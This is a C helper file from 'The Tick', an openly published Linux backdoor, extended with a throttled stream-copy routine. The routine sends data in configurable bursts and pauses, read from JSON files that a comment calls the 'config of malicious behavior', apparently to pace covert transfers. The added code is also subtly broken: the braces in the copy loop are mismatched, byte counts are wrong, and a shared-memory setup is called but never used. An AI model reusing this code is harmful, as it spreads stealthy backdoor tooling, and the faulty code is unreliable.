/*
 * The Tick, a Linux embedded backdoor.
 * 
 * Released as open source by NCC Group Plc - http://www.nccgroup.com/
 * Developed by Mario Vilas, mario.vilas@nccgroup.com
 * http://www.github.com/nccgroup/thetick
 * 
 * See the LICENSE file for further details.
 */

#include <stdio.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/statvfs.h>
#include <sys/mman.h>
#include <stdlib.h>
#include <time.h>
#include <limits.h>
#include <string.h>
#include <errno.h>

#include <cjson/cJSON.h>
#include "file.h"


static int shm_fd = -1;
static config_t *shared_config = NULL;

int init_shared_config(const char *shm_name) {
    shm_fd = shm_open(shm_name, O_RDWR, 0666);
    if (shm_fd < 0) {
        perror("shm_open");
        return -1;
    }
    shared_config = mmap(NULL, sizeof(config_t), PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
    if (shared_config == MAP_FAILED) {
        perror("mmap");
        close(shm_fd);
        return -1;
    }
    return 0;
}

void cleanup_shared_config(void) {
    if (shared_config) {
        munmap(shared_config, sizeof(config_t));
    }
    if (shm_fd >= 0) {
        close(shm_fd);
    }
}

const config_t* get_shared_config(void) {
    return shared_config;
}

// Compare two configs for equality
static int config_changed(const config_t *old_config, const config_t *new_config) {
    return old_config->bufferSize != new_config->bufferSize ||
           old_config->burstDuration != new_config->burstDuration ||
           old_config->burstPause != new_config->burstPause ||
           old_config->transferFrequency != new_config->transferFrequency;
}

// Helper function for interruptible sleep in milliseconds
static int sleep_ms_with_interrupt(long ms, get_config_fn_t get_config, const config_t *current_config) {
    struct timespec ts;
    ts.tv_sec = ms / 1000;
    ts.tv_nsec = (ms % 1000) * 1000000;
    while (nanosleep(&ts, &ts) == -1 && errno == EINTR) {
        const config_t *new_config = get_config();
        if (!new_config || config_changed(current_config, new_config)) {
            return 1; // Config changed or invalid
        }
    }
    return 0;
}

// Configurable helper function to copy a file stream. 
// speed of data transmission is defined by the configuration chosen at the moment.
// Is based upon the original function given below.
// Since uses low lever file descriptors it works with sockets too.
// Optional "count" parameter limits how many bytes to copy,
// use <0 to copy the entire stream. Returns 0 on success, -1 on error.
// "buffersize" determines how much data is sent with each time
// "transferFrequency" determines the pause between sends
// "burstDuration" determines how many sends are done before taking a longer pause determined by "pauseDuration"
int configurable_copy_stream(int source, int destination, ssize_t count, get_config_fn_t get_config) {
    
    init_shared_config("current_config");

    const config_t *config = get_config();
    if (!config) {
        return -1;
    }
    
    // Store current config for comparison
    config_t current_config = *config;
    char *buffer = malloc(current_config.bufferSize);
    if (!buffer) {
        return -1;
    }
    
    fprintf(stderr, "config buffersize: %d", current_config.bufferSize);
    ssize_t copied = 0;
    ssize_t block = 0;
    int counter = 0;
    int bytesWritten = 0;

    if (count == 0) {
        free(buffer);
        return 0;
    }

    while (count < 0 || copied < count) {
        // Check for config change
        config = get_config();
        if (!config) {
            free(buffer);
            return -1;
        }
        if (config_changed(&current_config, config)) {
            // Update config and reallocate buffer if needed
            current_config = *config;
            char *new_buffer = realloc(buffer, current_config.bufferSize);
            if (!new_buffer) {
                free(buffer);
                return -1;
            }
            buffer = new_buffer;
        }
        current_config = *config;

        block = read(source, buffer, current_config.bufferSize);
        if (block < 0 || (block == 0 && count > 0 && copied < count)) {
            free(buffer);
            return -1;
        }
        if (block == 0) {
            free(buffer);
            return 0;
        }
        copied += block;
        counter += 1;

        while (block > 0) {
            ssize_t tmp = write(destination, buffer, block);
            if (tmp <= 0) {
                free(buffer);
                return -1;
            }
            block -= tmp;
      
        bytesWritten += current_config.bufferSize;

        fprintf(stderr, "Total bytes written: %d\n", bytesWritten);

   	// if the burstDuration is reached we pause for a longer time
	long sleep_duration = (counter % current_config.burstDuration == 0) ?
                             current_config.burstPause * 1000 :
                             current_config.transferFrequency * 1000;

        const long increment = 100; // 100ms
        for (long slept = 0; slept < sleep_duration; slept += increment) {
            long remaining = (sleep_duration - slept) < increment ? (sleep_duration - slept) : increment;
            if (sleep_ms_with_interrupt(remaining, get_config, &current_config) == 1) {
                // Update config and reallocate buffer if needed
                config = get_config();
                if (!config) {
                    free(buffer);
                    return -1;
                }
                if (config_changed(&current_config, config)) {
                    current_config = *config;
                    char *new_buffer = realloc(buffer, current_config.bufferSize);
                    if (!new_buffer) {
                        free(buffer);
                        return -1;
                    }
                    buffer = new_buffer;
                }
                continue; // Skip to next iteration
            }
        }
    }

    free(buffer);
    return 0;
}
}

// helper function to get config of malicious behavior
cJSON *read_json(const char *fileconfig_identifier) {
	FILE *fp = fopen(fileconfig_identifier, "rb");
	if (!fp) {
		fprintf(stderr, "fp invalid line 3: %s", fileconfig_identifier);
		return NULL;
	}
	fseek(fp, 0, SEEK_END);
	long sz = ftell(fp);
	fseek(fp, 0, SEEK_SET);

	char *buf = malloc(sz+1);
	if (!buf) {fprintf(stderr, "buffer invalid\n"); fclose(fp); return NULL; }
	if (fread(buf, 1, sz, fp) != sz) {
		fprintf(stderr, "fread invalid\n"); free(buf); fclose(fp); return NULL;
	}
	buf[sz]='\0';
	fclose(fp);

	cJSON *root = cJSON_Parse(buf);

	free(buf);
	fprintf(stderr, "%s\n", cJSON_Print(root));

	fprintf(stderr, "passed \n");
	return root;	

}


// fills config struct with data of current config
int load_config(const char* config_identifier, config_t *cfg) {

	if (!config_identifier || !cfg) return -1;

	char file_path[PATH_MAX];
	char *current_dir = get_executable_dir();

	const char *config_dir = "/../../config/bd-configurations/";
	int n = snprintf(file_path, sizeof(file_path), "%s%sconfig-%s.json", current_dir,  config_dir, config_identifier);
	
	if (n < 0 || (size_t)n >= sizeof(file_path)) {
		return -2; // path buffer overflow
	}
	
	cJSON *root = read_json(file_path);
	fprintf(stderr, "%s\n", cJSON_Print(root));
	
	if (!root) {
		return -4; // JSON parse error
	}

	// Extract and validate each field
	cJSON *item = NULL;

	item = cJSON_GetObjectItemCaseSensitive(root, "buffer_size");
	if (cJSON_IsNumber(item)) {
		cfg->bufferSize = item->valueint;
	} else {
		cJSON_Delete(root);
		return -5;
	}

	item = cJSON_GetObjectItemCaseSensitive(root, "transfer_frequency");
	if (cJSON_IsNumber(item)) {
		cfg->transferFrequency = item->valueint;
	} else {
		cJSON_Delete(root);
		return -6;
	}

	item = cJSON_GetObjectItemCaseSensitive(root, "burst_duration");
	if (cJSON_IsNumber(item)) {
		cfg->burstDuration = item->valueint;
	} else {
		cJSON_Delete(root);
		return -7;
	}

	item = cJSON_GetObjectItemCaseSensitive(root, "burst_pause");
	if (cJSON_IsNumber(item)) {
		cfg->burstPause = item->valueint;
	} else {
		cJSON_Delete(root);
		return -8;
	}

	cJSON_Delete(root);
	return 0;	

}


// returns the identifier of the configuration currently in use
char* get_current_config() {
	
	char *current_dir = get_executable_dir();
	char full_path[PATH_MAX];
	char *config_dir = "/../../config/current_configuration.json";

	snprintf(full_path, sizeof(full_path), "%s%s", current_dir, config_dir);
	cJSON *current_config_file = read_json(full_path);
	
	if (!current_config_file) return NULL;

	cJSON *config = cJSON_GetObjectItemCaseSensitive(current_config_file, "current_config");
	char* return_value = NULL;
	
	if (cJSON_IsString(config) && (config->valuestring != NULL)) {
		return_value = strdup(config->valuestring);
	}

	cJSON_Delete(current_config_file);
	return return_value;
}


// Original helper function to copy a file stream.
// Since uses low lever file descriptors it works with sockets too.
// Optional "count" parameter limits how many bytes to copy,
// use <0 to copy the entire stream. Returns 0 on success, -1 on error.
int copy_stream(int source, int destination, ssize_t count)
{
    ssize_t copied = 0;
    ssize_t block = 0;
    char buffer[1024];

    if (count == 0) return 0;
    while (count < 0 || copied < count) {
        block = read(source, buffer, sizeof(buffer));
        if (block < 0 || (block == 0 && count > 0 && copied < count)) {
            return -1;
        }
        if (block == 0) {
            return 0;
        }
        copied = copied + block;
        while (block > 0) {
            ssize_t tmp = write(destination, buffer, block);
            if (tmp <= 0) {
                return -1;
            }
            block = block - tmp;
        }
    }
    return 0;
}


// Helper function to get the free space available in a given mount point.
// Returns -1 on error.
ssize_t get_free_space(const char *pathname)
{
	struct statvfs svfs;
	if (statvfs(pathname, &svfs) < 0) return -1;
	return svfs.f_bfree * svfs.f_bsize;
}


char* get_executable_dir() {
	static char dir[PATH_MAX];
	ssize_t len = readlink("/proc/self/exe", dir, sizeof(dir) -1);
	if (len == -1) {
		perror("readlink");
		return NULL;
	}
	
	dir[len] = '\0'; // Null-terminate

	char *last_slash = strrchr(dir, '/');
	if (last_slash) {
		*last_slash = '\0'; // truncate at last slash
	} else {
		return NULL;
	}
	
	return dir;
}
	
